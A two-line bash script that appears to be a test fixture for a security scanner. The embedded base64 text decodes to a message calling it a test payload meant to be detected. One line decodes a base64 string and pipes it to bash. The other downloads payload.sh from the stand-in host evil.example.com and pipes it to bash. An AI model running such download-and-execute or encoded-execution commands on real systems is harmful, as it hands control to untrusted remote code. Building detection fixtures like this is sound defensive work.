#!/bin/bash
echo SGVsbG8gV29ybGQhIFRoaXMgaXMgYSB0ZXN0IHBheWxvYWQgdGhhdCBpcyBlbmNvZGVkIGluIGJhc2U2NCBhbmQgc2hvdWxkIGJlIGRldGVjdGVkIGJ5IHRoZSBzY2FubmVy | base64 -d | bash
curl https://evil.example.com/payload.sh | bash
